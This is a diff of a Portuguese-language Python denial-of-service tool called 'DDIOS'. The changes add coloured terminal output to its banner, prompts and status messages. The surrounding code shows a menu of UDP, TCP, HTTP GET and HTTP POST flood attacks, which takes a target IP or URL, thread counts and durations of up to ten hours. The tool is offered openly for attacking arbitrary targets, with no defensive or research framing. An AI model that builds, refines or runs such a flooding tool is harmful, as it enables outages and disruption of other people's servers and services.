@@ -8,13 +8,22 @@ import requests
 from sys import stdout
 import os
 
+# Códigos de cores ANSI
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+BLUE = "\033[94m"
+MAGENTA = "\033[95m"
+CYAN = "\033[96m"
+RESET = "\033[0m"
+
 def clear_terminal():
-    print("\033c", end="")  # ANSI escape code
+    print("\033c", end="")  # Limpa terminal
 
 clear_terminal()
 
 def print_banner():
-    banner = """
+    banner = f"""{MAGENTA}
 ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ 
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
@@ -22,7 +31,7 @@ def print_banner():
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
-    """
+{RESET}"""
     print(banner)
 
 class CountdownStats:
@@ -43,21 +52,21 @@ class CountdownStats:
 
 def countdown(stats: CountdownStats):
     while stats.is_running():
-        stdout.write(f"\r[*] Tempo restante: {stats.remaining()}s | Pacotes enviados: {stats.packets_sent} ")
+        stdout.write(f"\r{YELLOW}[*] Tempo restante: {stats.remaining()}s | Pacotes enviados: {stats.packets_sent} {RESET}")
         stdout.flush()
         time.sleep(1)
-    print("\n[*] Ataque finalizado!")
+    print(f"\n{YELLOW}[*] Ataque finalizado!{RESET}")
 
 def input_int(prompt, min_val=None, max_val=None):
     while True:
         try:
-            val = int(input(prompt).strip())
+            val = int(input(f"{CYAN}{prompt}{RESET}").strip())
             if (min_val is not None and val < min_val) or (max_val is not None and val > max_val):
-                print(f"Digite um número entre {min_val} e {max_val}.")
+                print(f"{RED}Digite um número entre {min_val} e {max_val}.{RESET}")
                 continue
             return val
         except:
-            print("Entrada inválida, digite um número inteiro.")
+            print(f"{RED}Entrada inválida, digite um número inteiro.{RESET}")
 
 def udp_flood(target_ip, target_port, threads, duration):
     stats = CountdownStats(duration)
@@ -185,24 +194,24 @@ def http_post_flood(url, threads, duration):
 def main():
     print_banner()
     while True:
-        print("\nEscolha o tipo de ataque:")
-        print("[1] UDP Flood Avançado")
-        print("[2] TCP Flood Avançado")
-        print("[3] HTTP GET Flood Avançado")
-        print("[4] HTTP POST Flood Avançado")
-        print("[0] Sair")
+        print(f"\n{BLUE}Escolha o tipo de ataque:{RESET}")
+        print(f"{GREEN}[1]{RESET} UDP Flood Avançado")
+        print(f"{GREEN}[2]{RESET} TCP Flood Avançado")
+        print(f"{GREEN}[3]{RESET} HTTP GET Flood Avançado")
+        print(f"{GREEN}[4]{RESET} HTTP POST Flood Avançado")
+        print(f"{GREEN}[0]{RESET} Sair")
 
-        choice = input("Opção: ").strip()
+        choice = input(f"{CYAN}Opção: {RESET}").strip()
         if choice == "0":
-            print("Obrigado por ter utilizado o DDIOS, até logo...")
+            print(f"{YELLOW}Obrigado por ter utilizado o DDIOS, até logo...{RESET}")
             sys.exit(0)
 
         if choice in ["1", "2"]:
-            ip = input("Digite o IP alvo: ").strip()
+            ip = input(f"{CYAN}Digite o IP alvo: {RESET}").strip()
             port = input_int("Digite a porta alvo: ", 1, 65535)
             threads = input_int("Número de threads (recomendo <= 300): ", 1, 300)
             duration = input_int("Duração em segundos (máximo 36000): ", 1, 36000)
-            print(f"\nIniciando ataque {'UDP' if choice=='1' else 'TCP'} flood em {ip}:{port} com {threads} threads por {duration}s...\n")
+            print(f"\n{YELLOW}Iniciando ataque {'UDP' if choice=='1' else 'TCP'} flood em {ip}:{port} com {threads} threads por {duration}s...{RESET}\n")
 
             if choice == "1":
                 udp_flood(ip, port, threads, duration)
@@ -210,10 +219,10 @@ def main():
                 tcp_flood(ip, port, threads, duration)
 
         elif choice in ["3", "4"]:
-            url = input("Digite a URL alvo (ex: https://exemplo.com): ").strip()
+            url = input(f"{CYAN}Digite a URL alvo (ex: https://exemplo.com): {RESET}").strip()
             threads = input_int("Número de threads (recomendo <= 150): ", 1, 150)
             duration = input_int("Duração em segundos (máximo 36000): ", 1, 36000)
-            print(f"\nIniciando ataque HTTP {'GET' if choice=='3' else 'POST'} flood em {url} com {threads} threads por {duration}s...\n")
+            print(f"\n{YELLOW}Iniciando ataque HTTP {'GET' if choice=='3' else 'POST'} flood em {url} com {threads} threads por {duration}s...{RESET}\n")
 
             if choice == "3":
                 http_get_flood(url, threads, duration)
@@ -221,7 +230,7 @@ def main():
                 http_post_flood(url, threads, duration)
 
         else:
-            print("Opção inválida! Tente novamente.\n")
+            print(f"{RED}Opção inválida! Tente novamente.{RESET}\n")
 
 if __name__ == "__main__":
     main()
